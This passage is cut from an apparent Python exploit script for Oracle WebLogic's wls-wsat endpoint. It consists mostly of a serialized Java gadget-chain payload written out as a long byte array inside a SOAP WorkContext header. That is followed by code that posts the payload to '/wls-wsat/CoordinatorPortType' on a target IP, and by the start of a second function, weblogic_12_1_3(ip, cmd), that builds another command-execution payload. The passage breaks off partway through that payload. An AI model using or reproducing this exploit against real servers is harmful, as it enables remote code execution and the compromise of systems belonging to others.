index=\"4301\"><byte>1</byte></void><void index=\"4302\"><byte>0</byte></void><void index=\"4303\"><byte>37</byte></void><void index=\"4304\"><byte>76</byte></void><void index=\"4305\"><byte>121</byte></void><void index=\"4306\"><byte>115</byte></void><void index=\"4307\"><byte>111</byte></void><void index=\"4308\"><byte>115</byte></void><void index=\"4309\"><byte>101</byte></void><void index=\"4310\"><byte>114</byte></void><void index=\"4311\"><byte>105</byte></void><void index=\"4312\"><byte>97</byte></void><void index=\"4313\"><byte>108</byte></void><void index=\"4314\"><byte>47</byte></void><void index=\"4315\"><byte>112</byte></void><void index=\"4316\"><byte>97</byte></void><void index=\"4317\"><byte>121</byte></void><void index=\"4318\"><byte>108</byte></void><void index=\"4319\"><byte>111</byte></void><void index=\"4320\"><byte>97</byte></void><void index=\"4321\"><byte>100</byte></void><void index=\"4322\"><byte>115</byte></void><void index=\"4323\"><byte>47</byte></void><void index=\"4324\"><byte>117</byte></void><void index=\"4325\"><byte>116</byte></void><void index=\"4326\"><byte>105</byte></void><void index=\"4327\"><byte>108</byte></void><void index=\"4328\"><byte>47</byte></void><void index=\"4329\"><byte>71</byte></void><void index=\"4330\"><byte>97</byte></void><void index=\"4331\"><byte>100</byte></void><void index=\"4332\"><byte>103</byte></void><void index=\"4333\"><byte>101</byte></void><void index=\"4334\"><byte>116</byte></void><void index=\"4335\"><byte>115</byte></void><void index=\"4336\"><byte>36</byte></void><void index=\"4337\"><byte>70</byte></void><void index=\"4338\"><byte>111</byte></void><void index=\"4339\"><byte>111</byte></void><void index=\"4340\"><byte>59</byte></void><void index=\"4341\"><byte>1</byte></void><void index=\"4342\"><byte>0</byte></void><void index=\"4343\"><byte>10</byte></void><void index=\"4344\"><byte>83</byte></void><void index=\"4345\"><byte>111</byte></void><void index=\"4346\"><byte>117</byte></void><void index=\"4347\"><byte>114</byte></void><void index=\"4348\"><byte>99</byte></void><void index=\"4349\"><byte>101</byte></void><void index=\"4350\"><byte>70</byte></void><void index=\"4351\"><byte>105</byte></void><void index=\"4352\"><byte>108</byte></void><void index=\"4353\"><byte>101</byte></void><void index=\"4354\"><byte>1</byte></void><void index=\"4355\"><byte>0</byte></void><void index=\"4356\"><byte>12</byte></void><void index=\"4357\"><byte>71</byte></void><void index=\"4358\"><byte>97</byte></void><void index=\"4359\"><byte>100</byte></void><void index=\"4360\"><byte>103</byte></void><void index=\"4361\"><byte>101</byte></void><void index=\"4362\"><byte>116</byte></void><void index=\"4363\"><byte>115</byte></void><void index=\"4364\"><byte>46</byte></void><void index=\"4365\"><byte>106</byte></void><void index=\"4366\"><byte>97</byte></void><void index=\"4367\"><byte>118</byte></void><void index=\"4368\"><byte>97</byte></void><void index=\"4369\"><byte>12</byte></void><void index=\"4370\"><byte>0</byte></void><void index=\"4371\"><byte>10</byte></void><void index=\"4372\"><byte>0</byte></void><void index=\"4373\"><byte>11</byte></void><void index=\"4374\"><byte>7</byte></void><void index=\"4375\"><byte>0</byte></void><void index=\"4376\"><byte>26</byte></void><void index=\"4377\"><byte>1</byte></void><void index=\"4378\"><byte>0</byte></void><void index=\"4379\"><byte>35</byte></void><void index=\"4380\"><byte>121</byte></void><void index=\"4381\"><byte>115</byte></void><void index=\"4382\"><byte>111</byte></void><void index=\"4383\"><byte>115</byte></void><void index=\"4384\"><byte>101</byte></void><void index=\"4385\"><byte>114</byte></void><void index=\"4386\"><byte>105</byte></void><void index=\"4387\"><byte>97</byte></void><void index=\"4388\"><byte>108</byte></void><void index=\"4389\"><byte>47</byte></void><void index=\"4390\"><byte>112</byte></void><void index=\"4391\"><byte>97</byte></void><void index=\"4392\"><byte>121</byte></void><void index=\"4393\"><byte>108</byte></void><void index=\"4394\"><byte>111</byte></void><void index=\"4395\"><byte>97</byte></void><void index=\"4396\"><byte>100</byte></void><void index=\"4397\"><byte>115</byte></void><void index=\"4398\"><byte>47</byte></void><void index=\"4399\"><byte>117</byte></void><void index=\"4400\"><byte>116</byte></void><void index=\"4401\"><byte>105</byte></void><void index=\"4402\"><byte>108</byte></void><void index=\"4403\"><byte>47</byte></void><void index=\"4404\"><byte>71</byte></void><void index=\"4405\"><byte>97</byte></void><void index=\"4406\"><byte>100</byte></void><void index=\"4407\"><byte>103</byte></void><void index=\"4408\"><byte>101</byte></void><void index=\"4409\"><byte>116</byte></void><void index=\"4410\"><byte>115</byte></void><void index=\"4411\"><byte>36</byte></void><void index=\"4412\"><byte>70</byte></void><void index=\"4413\"><byte>111</byte></void><void index=\"4414\"><byte>111</byte></void><void index=\"4415\"><byte>1</byte></void><void index=\"4416\"><byte>0</byte></void><void index=\"4417\"><byte>16</byte></void><void index=\"4418\"><byte>106</byte></void><void index=\"4419\"><byte>97</byte></void><void index=\"4420\"><byte>118</byte></void><void index=\"4421\"><byte>97</byte></void><void index=\"4422\"><byte>47</byte></void><void index=\"4423\"><byte>108</byte></void><void index=\"4424\"><byte>97</byte></void><void index=\"4425\"><byte>110</byte></void><void index=\"4426\"><byte>103</byte></void><void index=\"4427\"><byte>47</byte></void><void index=\"4428\"><byte>79</byte></void><void index=\"4429\"><byte>98</byte></void><void index=\"4430\"><byte>106</byte></void><void index=\"4431\"><byte>101</byte></void><void index=\"4432\"><byte>99</byte></void><void index=\"4433\"><byte>116</byte></void><void index=\"4434\"><byte>1</byte></void><void index=\"4435\"><byte>0</byte></void><void index=\"4436\"><byte>20</byte></void><void index=\"4437\"><byte>106</byte></void><void index=\"4438\"><byte>97</byte></void><void index=\"4439\"><byte>118</byte></void><void index=\"4440\"><byte>97</byte></void><void index=\"4441\"><byte>47</byte></void><void index=\"4442\"><byte>105</byte></void><void index=\"4443\"><byte>111</byte></void><void index=\"4444\"><byte>47</byte></void><void index=\"4445\"><byte>83</byte></void><void index=\"4446\"><byte>101</byte></void><void index=\"4447\"><byte>114</byte></void><void index=\"4448\"><byte>105</byte></void><void index=\"4449\"><byte>97</byte></void><void index=\"4450\"><byte>108</byte></void><void index=\"4451\"><byte>105</byte></void><void index=\"4452\"><byte>122</byte></void><void index=\"4453\"><byte>97</byte></void><void index=\"4454\"><byte>98</byte></void><void index=\"4455\"><byte>108</byte></void><void index=\"4456\"><byte>101</byte></void><void index=\"4457\"><byte>1</byte></void><void index=\"4458\"><byte>0</byte></void><void index=\"4459\"><byte>31</byte></void><void index=\"4460\"><byte>121</byte></void><void index=\"4461\"><byte>115</byte></void><void index=\"4462\"><byte>111</byte></void><void index=\"4463\"><byte>115</byte></void><void index=\"4464\"><byte>101</byte></void><void index=\"4465\"><byte>114</byte></void><void index=\"4466\"><byte>105</byte></void><void index=\"4467\"><byte>97</byte></void><void index=\"4468\"><byte>108</byte></void><void index=\"4469\"><byte>47</byte></void><void index=\"4470\"><byte>112</byte></void><void index=\"4471\"><byte>97</byte></void><void index=\"4472\"><byte>121</byte></void><void index=\"4473\"><byte>108</byte></void><void index=\"4474\"><byte>111</byte></void><void index=\"4475\"><byte>97</byte></void><void index=\"4476\"><byte>100</byte></void><void index=\"4477\"><byte>115</byte></void><void index=\"4478\"><byte>47</byte></void><void index=\"4479\"><byte>117</byte></void><void index=\"4480\"><byte>116</byte></void><void index=\"4481\"><byte>105</byte></void><void index=\"4482\"><byte>108</byte></void><void index=\"4483\"><byte>47</byte></void><void index=\"4484\"><byte>71</byte></void><void index=\"4485\"><byte>97</byte></void><void index=\"4486\"><byte>100</byte></void><void index=\"4487\"><byte>103</byte></void><void index=\"4488\"><byte>101</byte></void><void index=\"4489\"><byte>116</byte></void><void index=\"4490\"><byte>115</byte></void><void index=\"4491\"><byte>0</byte></void><void index=\"4492\"><byte>33</byte></void><void index=\"4493\"><byte>0</byte></void><void index=\"4494\"><byte>2</byte></void><void index=\"4495\"><byte>0</byte></void><void index=\"4496\"><byte>3</byte></void><void index=\"4497\"><byte>0</byte></void><void index=\"4498\"><byte>1</byte></void><void index=\"4499\"><byte>0</byte></void><void index=\"4500\"><byte>4</byte></void><void index=\"4501\"><byte>0</byte></void><void index=\"4502\"><byte>1</byte></void><void index=\"4503\"><byte>0</byte></void><void index=\"4504\"><byte>26</byte></void><void index=\"4505\"><byte>0</byte></void><void index=\"4506\"><byte>5</byte></void><void index=\"4507\"><byte>0</byte></void><void index=\"4508\"><byte>6</byte></void><void index=\"4509\"><byte>0</byte></void><void index=\"4510\"><byte>1</byte></void><void index=\"4511\"><byte>0</byte></void><void index=\"4512\"><byte>7</byte></void><void index=\"4513\"><byte>0</byte></void><void index=\"4514\"><byte>0</byte></void><void index=\"4515\"><byte>0</byte></void><void index=\"4516\"><byte>2</byte></void><void index=\"4517\"><byte>0</byte></void><void index=\"4518\"><byte>8</byte></void><void index=\"4519\"><byte>0</byte></void><void index=\"4520\"><byte>1</byte></void><void index=\"4521\"><byte>0</byte></void><void index=\"4522\"><byte>1</byte></void><void index=\"4523\"><byte>0</byte></void><void index=\"4524\"><byte>10</byte></void><void index=\"4525\"><byte>0</byte></void><void index=\"4526\"><byte>11</byte></void><void index=\"4527\"><byte>0</byte></void><void index=\"4528\"><byte>1</byte></void><void index=\"4529\"><byte>0</byte></void><void index=\"4530\"><byte>12</byte></void><void index=\"4531\"><byte>0</byte></void><void index=\"4532\"><byte>0</byte></void><void index=\"4533\"><byte>0</byte></void><void index=\"4534\"><byte>47</byte></void><void index=\"4535\"><byte>0</byte></void><void index=\"4536\"><byte>1</byte></void><void index=\"4537\"><byte>0</byte></void><void index=\"4538\"><byte>1</byte></void><void index=\"4539\"><byte>0</byte></void><void index=\"4540\"><byte>0</byte></void><void index=\"4541\"><byte>0</byte></void><void index=\"4542\"><byte>5</byte></void><void index=\"4543\"><byte>42</byte></void><void index=\"4544\"><byte>-73</byte></void><void index=\"4545\"><byte>0</byte></void><void index=\"4546\"><byte>1</byte></void><void index=\"4547\"><byte>-79</byte></void><void index=\"4548\"><byte>0</byte></void><void index=\"4549\"><byte>0</byte></void><void index=\"4550\"><byte>0</byte></void><void index=\"4551\"><byte>2</byte></void><void index=\"4552\"><byte>0</byte></void><void index=\"4553\"><byte>13</byte></void><void index=\"4554\"><byte>0</byte></void><void index=\"4555\"><byte>0</byte></void><void index=\"4556\"><byte>0</byte></void><void index=\"4557\"><byte>6</byte></void><void index=\"4558\"><byte>0</byte></void><void index=\"4559\"><byte>1</byte></void><void index=\"4560\"><byte>0</byte></void><void index=\"4561\"><byte>0</byte></void><void index=\"4562\"><byte>0</byte></void><void index=\"4563\"><byte>60</byte></void><void index=\"4564\"><byte>0</byte></void><void index=\"4565\"><byte>14</byte></void><void index=\"4566\"><byte>0</byte></void><void index=\"4567\"><byte>0</byte></void><void index=\"4568\"><byte>0</byte></void><void index=\"4569\"><byte>12</byte></void><void index=\"4570\"><byte>0</byte></void><void index=\"4571\"><byte>1</byte></void><void index=\"4572\"><byte>0</byte></void><void index=\"4573\"><byte>0</byte></void><void index=\"4574\"><byte>0</byte></void><void index=\"4575\"><byte>5</byte></void><void index=\"4576\"><byte>0</byte></void><void index=\"4577\"><byte>15</byte></void><void index=\"4578\"><byte>0</byte></void><void index=\"4579\"><byte>18</byte></void><void index=\"4580\"><byte>0</byte></void><void index=\"4581\"><byte>0</byte></void><void index=\"4582\"><byte>0</byte></void><void index=\"4583\"><byte>2</byte></void><void index=\"4584\"><byte>0</byte></void><void index=\"4585\"><byte>19</byte></void><void index=\"4586\"><byte>0</byte></void><void index=\"4587\"><byte>0</byte></void><void index=\"4588\"><byte>0</byte></void><void index=\"4589\"><byte>2</byte></void><void index=\"4590\"><byte>0</byte></void><void index=\"4591\"><byte>20</byte></void><void index=\"4592\"><byte>0</byte></void><void index=\"4593\"><byte>17</byte></void><void index=\"4594\"><byte>0</byte></void><void index=\"4595\"><byte>0</byte></void><void index=\"4596\"><byte>0</byte></void><void index=\"4597\"><byte>10</byte></void><void index=\"4598\"><byte>0</byte></void><void index=\"4599\"><byte>1</byte></void><void index=\"4600\"><byte>0</byte></void><void index=\"4601\"><byte>2</byte></void><void index=\"4602\"><byte>0</byte></void><void index=\"4603\"><byte>22</byte></void><void index=\"4604\"><byte>0</byte></void><void index=\"4605\"><byte>16</byte></void><void index=\"4606\"><byte>0</byte></void><void index=\"4607\"><byte>9</byte></void><void index=\"4608\"><byte>112</byte></void><void index=\"4609\"><byte>116</byte></void><void index=\"4610\"><byte>0</byte></void><void index=\"4611\"><byte>4</byte></void><void index=\"4612\"><byte>80</byte></void><void index=\"4613\"><byte>119</byte></void><void index=\"4614\"><byte>110</byte></void><void index=\"4615\"><byte>114</byte></void><void index=\"4616\"><byte>112</byte></void><void index=\"4617\"><byte>119</byte></void><void index=\"4618\"><byte>1</byte></void><void index=\"4619\"><byte>0</byte></void><void index=\"4620\"><byte>120</byte></void><void index=\"4621\"><byte>115</byte></void><void index=\"4622\"><byte>125</byte></void><void index=\"4623\"><byte>0</byte></void><void index=\"4624\"><byte>0</byte></void><void index=\"4625\"><byte>0</byte></void><void index=\"4626\"><byte>1</byte></void><void index=\"4627\"><byte>0</byte></void><void index=\"4628\"><byte>29</byte></void><void index=\"4629\"><byte>106</byte></void><void index=\"4630\"><byte>97</byte></void><void index=\"4631\"><byte>118</byte></void><void index=\"4632\"><byte>97</byte></void><void index=\"4633\"><byte>120</byte></void><void index=\"4634\"><byte>46</byte></void><void index=\"4635\"><byte>120</byte></void><void index=\"4636\"><byte>109</byte></void><void index=\"4637\"><byte>108</byte></void><void index=\"4638\"><byte>46</byte></void><void index=\"4639\"><byte>116</byte></void><void index=\"4640\"><byte>114</byte></void><void index=\"4641\"><byte>97</byte></void><void index=\"4642\"><byte>110</byte></void><void index=\"4643\"><byte>115</byte></void><void index=\"4644\"><byte>102</byte></void><void index=\"4645\"><byte>111</byte></void><void index=\"4646\"><byte>114</byte></void><void index=\"4647\"><byte>109</byte></void><void index=\"4648\"><byte>46</byte></void><void index=\"4649\"><byte>84</byte></void><void index=\"4650\"><byte>101</byte></void><void index=\"4651\"><byte>109</byte></void><void index=\"4652\"><byte>112</byte></void><void index=\"4653\"><byte>108</byte></void><void index=\"4654\"><byte>97</byte></void><void index=\"4655\"><byte>116</byte></void><void index=\"4656\"><byte>101</byte></void><void index=\"4657\"><byte>115</byte></void><void index=\"4658\"><byte>120</byte></void><void index=\"4659\"><byte>114</byte></void><void index=\"4660\"><byte>0</byte></void><void index=\"4661\"><byte>23</byte></void><void index=\"4662\"><byte>106</byte></void><void index=\"4663\"><byte>97</byte></void><void index=\"4664\"><byte>118</byte></void><void index=\"4665\"><byte>97</byte></void><void index=\"4666\"><byte>46</byte></void><void index=\"4667\"><byte>108</byte></void><void index=\"4668\"><byte>97</byte></void><void index=\"4669\"><byte>110</byte></void><void index=\"4670\"><byte>103</byte></void><void index=\"4671\"><byte>46</byte></void><void index=\"4672\"><byte>114</byte></void><void index=\"4673\"><byte>101</byte></void><void index=\"4674\"><byte>102</byte></void><void index=\"4675\"><byte>108</byte></void><void index=\"4676\"><byte>101</byte></void><void index=\"4677\"><byte>99</byte></void><void index=\"4678\"><byte>116</byte></void><void index=\"4679\"><byte>46</byte></void><void index=\"4680\"><byte>80</byte></void><void index=\"4681\"><byte>114</byte></void><void index=\"4682\"><byte>111</byte></void><void index=\"4683\"><byte>120</byte></void><void index=\"4684\"><byte>121</byte></void><void index=\"4685\"><byte>-31</byte></void><void index=\"4686\"><byte>39</byte></void><void index=\"4687\"><byte>-38</byte></void><void index=\"4688\"><byte>32</byte></void><void index=\"4689\"><byte>-52</byte></void><void index=\"4690\"><byte>16</byte></void><void index=\"4691\"><byte>67</byte></void><void index=\"4692\"><byte>-53</byte></void><void index=\"4693\"><byte>2</byte></void><void index=\"4694\"><byte>0</byte></void><void index=\"4695\"><byte>1</byte></void><void index=\"4696\"><byte>76</byte></void><void index=\"4697\"><byte>0</byte></void><void index=\"4698\"><byte>1</byte></void><void index=\"4699\"><byte>104</byte></void><void index=\"4700\"><byte>116</byte></void><void index=\"4701\"><byte>0</byte></void><void index=\"4702\"><byte>37</byte></void><void index=\"4703\"><byte>76</byte></void><void index=\"4704\"><byte>106</byte></void><void index=\"4705\"><byte>97</byte></void><void index=\"4706\"><byte>118</byte></void><void index=\"4707\"><byte>97</byte></void><void index=\"4708\"><byte>47</byte></void><void index=\"4709\"><byte>108</byte></void><void index=\"4710\"><byte>97</byte></void><void index=\"4711\"><byte>110</byte></void><void index=\"4712\"><byte>103</byte></void><void index=\"4713\"><byte>47</byte></void><void index=\"4714\"><byte>114</byte></void><void index=\"4715\"><byte>101</byte></void><void index=\"4716\"><byte>102</byte></void><void index=\"4717\"><byte>108</byte></void><void index=\"4718\"><byte>101</byte></void><void index=\"4719\"><byte>99</byte></void><void index=\"4720\"><byte>116</byte></void><void index=\"4721\"><byte>47</byte></void><void index=\"4722\"><byte>73</byte></void><void index=\"4723\"><byte>110</byte></void><void index=\"4724\"><byte>118</byte></void><void index=\"4725\"><byte>111</byte></void><void index=\"4726\"><byte>99</byte></void><void index=\"4727\"><byte>97</byte></void><void index=\"4728\"><byte>116</byte></void><void index=\"4729\"><byte>105</byte></void><void index=\"4730\"><byte>111</byte></void><void index=\"4731\"><byte>110</byte></void><void index=\"4732\"><byte>72</byte></void><void index=\"4733\"><byte>97</byte></void><void index=\"4734\"><byte>110</byte></void><void index=\"4735\"><byte>100</byte></void><void index=\"4736\"><byte>108</byte></void><void index=\"4737\"><byte>101</byte></void><void index=\"4738\"><byte>114</byte></void><void index=\"4739\"><byte>59</byte></void><void index=\"4740\"><byte>120</byte></void><void index=\"4741\"><byte>112</byte></void><void index=\"4742\"><byte>115</byte></void><void index=\"4743\"><byte>114</byte></void><void index=\"4744\"><byte>0</byte></void><void index=\"4745\"><byte>50</byte></void><void index=\"4746\"><byte>115</byte></void><void index=\"4747\"><byte>117</byte></void><void index=\"4748\"><byte>110</byte></void><void index=\"4749\"><byte>46</byte></void><void index=\"4750\"><byte>114</byte></void><void index=\"4751\"><byte>101</byte></void><void index=\"4752\"><byte>102</byte></void><void index=\"4753\"><byte>108</byte></void><void index=\"4754\"><byte>101</byte></void><void index=\"4755\"><byte>99</byte></void><void index=\"4756\"><byte>116</byte></void><void index=\"4757\"><byte>46</byte></void><void index=\"4758\"><byte>97</byte></void><void index=\"4759\"><byte>110</byte></void><void index=\"4760\"><byte>110</byte></void><void index=\"4761\"><byte>111</byte></void><void index=\"4762\"><byte>116</byte></void><void index=\"4763\"><byte>97</byte></void><void index=\"4764\"><byte>116</byte></void><void index=\"4765\"><byte>105</byte></void><void index=\"4766\"><byte>111</byte></void><void index=\"4767\"><byte>110</byte></void><void index=\"4768\"><byte>46</byte></void><void index=\"4769\"><byte>65</byte></void><void index=\"4770\"><byte>110</byte></void><void index=\"4771\"><byte>110</byte></void><void index=\"4772\"><byte>111</byte></void><void index=\"4773\"><byte>116</byte></void><void index=\"4774\"><byte>97</byte></void><void index=\"4775\"><byte>116</byte></void><void index=\"4776\"><byte>105</byte></void><void index=\"4777\"><byte>111</byte></void><void index=\"4778\"><byte>110</byte></void><void index=\"4779\"><byte>73</byte></void><void index=\"4780\"><byte>110</byte></void><void index=\"4781\"><byte>118</byte></void><void index=\"4782\"><byte>111</byte></void><void index=\"4783\"><byte>99</byte></void><void index=\"4784\"><byte>97</byte></void><void index=\"4785\"><byte>116</byte></void><void index=\"4786\"><byte>105</byte></void><void index=\"4787\"><byte>111</byte></void><void index=\"4788\"><byte>110</byte></void><void index=\"4789\"><byte>72</byte></void><void index=\"4790\"><byte>97</byte></void><void index=\"4791\"><byte>110</byte></void><void index=\"4792\"><byte>100</byte></void><void index=\"4793\"><byte>108</byte></void><void index=\"4794\"><byte>101</byte></void><void index=\"4795\"><byte>114</byte></void><void index=\"4796\"><byte>85</byte></void><void index=\"4797\"><byte>-54</byte></void><void index=\"4798\"><byte>-11</byte></void><void index=\"4799\"><byte>15</byte></void><void index=\"4800\"><byte>21</byte></void><void index=\"4801\"><byte>-53</byte></void><void index=\"4802\"><byte>126</byte></void><void index=\"4803\"><byte>-91</byte></void><void index=\"4804\"><byte>2</byte></void><void index=\"4805\"><byte>0</byte></void><void index=\"4806\"><byte>2</byte></void><void index=\"4807\"><byte>76</byte></void><void index=\"4808\"><byte>0</byte></void><void index=\"4809\"><byte>12</byte></void><void index=\"4810\"><byte>109</byte></void><void index=\"4811\"><byte>101</byte></void><void index=\"4812\"><byte>109</byte></void><void index=\"4813\"><byte>98</byte></void><void index=\"4814\"><byte>101</byte></void><void index=\"4815\"><byte>114</byte></void><void index=\"4816\"><byte>86</byte></void><void index=\"4817\"><byte>97</byte></void><void index=\"4818\"><byte>108</byte></void><void index=\"4819\"><byte>117</byte></void><void index=\"4820\"><byte>101</byte></void><void index=\"4821\"><byte>115</byte></void><void index=\"4822\"><byte>116</byte></void><void index=\"4823\"><byte>0</byte></void><void index=\"4824\"><byte>15</byte></void><void index=\"4825\"><byte>76</byte></void><void index=\"4826\"><byte>106</byte></void><void index=\"4827\"><byte>97</byte></void><void index=\"4828\"><byte>118</byte></void><void index=\"4829\"><byte>97</byte></void><void index=\"4830\"><byte>47</byte></void><void index=\"4831\"><byte>117</byte></void><void index=\"4832\"><byte>116</byte></void><void index=\"4833\"><byte>105</byte></void><void index=\"4834\"><byte>108</byte></void><void index=\"4835\"><byte>47</byte></void><void index=\"4836\"><byte>77</byte></void><void index=\"4837\"><byte>97</byte></void><void index=\"4838\"><byte>112</byte></void><void index=\"4839\"><byte>59</byte></void><void index=\"4840\"><byte>76</byte></void><void index=\"4841\"><byte>0</byte></void><void index=\"4842\"><byte>4</byte></void><void index=\"4843\"><byte>116</byte></void><void index=\"4844\"><byte>121</byte></void><void index=\"4845\"><byte>112</byte></void><void index=\"4846\"><byte>101</byte></void><void index=\"4847\"><byte>116</byte></void><void index=\"4848\"><byte>0</byte></void><void index=\"4849\"><byte>17</byte></void><void index=\"4850\"><byte>76</byte></void><void index=\"4851\"><byte>106</byte></void><void index=\"4852\"><byte>97</byte></void><void index=\"4853\"><byte>118</byte></void><void index=\"4854\"><byte>97</byte></void><void index=\"4855\"><byte>47</byte></void><void index=\"4856\"><byte>108</byte></void><void index=\"4857\"><byte>97</byte></void><void index=\"4858\"><byte>110</byte></void><void index=\"4859\"><byte>103</byte></void><void index=\"4860\"><byte>47</byte></void><void index=\"4861\"><byte>67</byte></void><void index=\"4862\"><byte>108</byte></void><void index=\"4863\"><byte>97</byte></void><void index=\"4864\"><byte>115</byte></void><void index=\"4865\"><byte>115</byte></void><void index=\"4866\"><byte>59</byte></void><void index=\"4867\"><byte>120</byte></void><void index=\"4868\"><byte>112</byte></void><void index=\"4869\"><byte>115</byte></void><void index=\"4870\"><byte>114</byte></void><void index=\"4871\"><byte>0</byte></void><void index=\"4872\"><byte>17</byte></void><void index=\"4873\"><byte>106</byte></void><void index=\"4874\"><byte>97</byte></void><void index=\"4875\"><byte>118</byte></void><void index=\"4876\"><byte>97</byte></void><void index=\"4877\"><byte>46</byte></void><void index=\"4878\"><byte>117</byte></void><void index=\"4879\"><byte>116</byte></void><void index=\"4880\"><byte>105</byte></void><void index=\"4881\"><byte>108</byte></void><void index=\"4882\"><byte>46</byte></void><void index=\"4883\"><byte>72</byte></void><void index=\"4884\"><byte>97</byte></void><void index=\"4885\"><byte>115</byte></void><void index=\"4886\"><byte>104</byte></void><void index=\"4887\"><byte>77</byte></void><void index=\"4888\"><byte>97</byte></void><void index=\"4889\"><byte>112</byte></void><void index=\"4890\"><byte>5</byte></void><void index=\"4891\"><byte>7</byte></void><void index=\"4892\"><byte>-38</byte></void><void index=\"4893\"><byte>-63</byte></void><void index=\"4894\"><byte>-61</byte></void><void index=\"4895\"><byte>22</byte></void><void index=\"4896\"><byte>96</byte></void><void index=\"4897\"><byte>-47</byte></void><void index=\"4898\"><byte>3</byte></void><void index=\"4899\"><byte>0</byte></void><void index=\"4900\"><byte>2</byte></void><void index=\"4901\"><byte>70</byte></void><void index=\"4902\"><byte>0</byte></void><void index=\"4903\"><byte>10</byte></void><void index=\"4904\"><byte>108</byte></void><void index=\"4905\"><byte>111</byte></void><void index=\"4906\"><byte>97</byte></void><void index=\"4907\"><byte>100</byte></void><void index=\"4908\"><byte>70</byte></void><void index=\"4909\"><byte>97</byte></void><void index=\"4910\"><byte>99</byte></void><void index=\"4911\"><byte>116</byte></void><void index=\"4912\"><byte>111</byte></void><void index=\"4913\"><byte>114</byte></void><void index=\"4914\"><byte>73</byte></void><void index=\"4915\"><byte>0</byte></void><void index=\"4916\"><byte>9</byte></void><void index=\"4917\"><byte>116</byte></void><void index=\"4918\"><byte>104</byte></void><void index=\"4919\"><byte>114</byte></void><void index=\"4920\"><byte>101</byte></void><void index=\"4921\"><byte>115</byte></void><void index=\"4922\"><byte>104</byte></void><void index=\"4923\"><byte>111</byte></void><void index=\"4924\"><byte>108</byte></void><void index=\"4925\"><byte>100</byte></void><void index=\"4926\"><byte>120</byte></void><void index=\"4927\"><byte>112</byte></void><void index=\"4928\"><byte>63</byte></void><void index=\"4929\"><byte>64</byte></void><void index=\"4930\"><byte>0</byte></void><void index=\"4931\"><byte>0</byte></void><void index=\"4932\"><byte>0</byte></void><void index=\"4933\"><byte>0</byte></void><void index=\"4934\"><byte>0</byte></void><void index=\"4935\"><byte>12</byte></void><void index=\"4936\"><byte>119</byte></void><void index=\"4937\"><byte>8</byte></void><void index=\"4938\"><byte>0</byte></void><void index=\"4939\"><byte>0</byte></void><void index=\"4940\"><byte>0</byte></void><void index=\"4941\"><byte>16</byte></void><void index=\"4942\"><byte>0</byte></void><void index=\"4943\"><byte>0</byte></void><void index=\"4944\"><byte>0</byte></void><void index=\"4945\"><byte>1</byte></void><void index=\"4946\"><byte>116</byte></void><void index=\"4947\"><byte>0</byte></void><void index=\"4948\"><byte>8</byte></void><void index=\"4949\"><byte>102</byte></void><void index=\"4950\"><byte>53</byte></void><void index=\"4951\"><byte>97</byte></void><void index=\"4952\"><byte>53</byte></void><void index=\"4953\"><byte>97</byte></void><void index=\"4954\"><byte>54</byte></void><void index=\"4955\"><byte>48</byte></void><void index=\"4956\"><byte>56</byte></void><void index=\"4957\"><byte>113</byte></void><void index=\"4958\"><byte>0</byte></void><void index=\"4959\"><byte>126</byte></void><void index=\"4960\"><byte>0</byte></void><void index=\"4961\"><byte>9</byte></void><void index=\"4962\"><byte>120</byte></void><void index=\"4963\"><byte>118</byte></void><void index=\"4964\"><byte>114</byte></void><void index=\"4965\"><byte>0</byte></void><void index=\"4966\"><byte>29</byte></void><void index=\"4967\"><byte>106</byte></void><void index=\"4968\"><byte>97</byte></void><void index=\"4969\"><byte>118</byte></void><void index=\"4970\"><byte>97</byte></void><void index=\"4971\"><byte>120</byte></void><void index=\"4972\"><byte>46</byte></void><void index=\"4973\"><byte>120</byte></void><void index=\"4974\"><byte>109</byte></void><void index=\"4975\"><byte>108</byte></void><void index=\"4976\"><byte>46</byte></void><void index=\"4977\"><byte>116</byte></void><void index=\"4978\"><byte>114</byte></void><void index=\"4979\"><byte>97</byte></void><void index=\"4980\"><byte>110</byte></void><void index=\"4981\"><byte>115</byte></void><void index=\"4982\"><byte>102</byte></void><void index=\"4983\"><byte>111</byte></void><void index=\"4984\"><byte>114</byte></void><void index=\"4985\"><byte>109</byte></void><void index=\"4986\"><byte>46</byte></void><void index=\"4987\"><byte>84</byte></void><void index=\"4988\"><byte>101</byte></void><void index=\"4989\"><byte>109</byte></void><void index=\"4990\"><byte>112</byte></void><void index=\"4991\"><byte>108</byte></void><void index=\"4992\"><byte>97</byte></void><void index=\"4993\"><byte>116</byte></void><void index=\"4994\"><byte>101</byte></void><void index=\"4995\"><byte>115</byte></void><void index=\"4996\"><byte>0</byte></void><void index=\"4997\"><byte>0</byte></void><void index=\"4998\"><byte>0</byte></void><void index=\"4999\"><byte>0</byte></void><void index=\"5000\"><byte>0</byte></void><void index=\"5001\"><byte>0</byte></void><void index=\"5002\"><byte>0</byte></void><void index=\"5003\"><byte>0</byte></void><void index=\"5004\"><byte>0</byte></void><void index=\"5005\"><byte>0</byte></void><void index=\"5006\"><byte>0</byte></void><void index=\"5007\"><byte>120</byte></void><void index=\"5008\"><byte>112</byte></void><void index=\"5009\"><byte>120</byte></void></array> </void></class> </work:WorkContext> </soapenv:Header> <soapenv:Body></soapenv:Body></soapenv:Envelope>\"\"\" url = \" %s /wls-wsat/CoordinatorPortType\" % ( ip ) rsp = requests . post ( url , data = body , verify = False , headers = headers ) logger . info ( \" \\r\\n \" + rsp . text ) def weblogic_12_1_3 ( ip , cmd ): headers = { \"Accept-Language\" : \"zh-CN,zh;q=0.9,en;q=0.8\" , \"User-Agent\" : \"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50\" , \"Content-Type\" : \"text/xml\" } body = '''<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:wsa=\"http://www.w3.org/2005/08/addressing\" xmlns:asy=\"http://www.bea.com/async/AsyncResponseService\"> <soapenv:Header> <wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo> <work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"> <java> <class><string>org.slf4j.ext.EventData</string> <void> <string> <java> <void class=\"sun.misc.BASE64Decoder\"> <void method=\"decodeBuffer\" id=\"byte_arr\"> 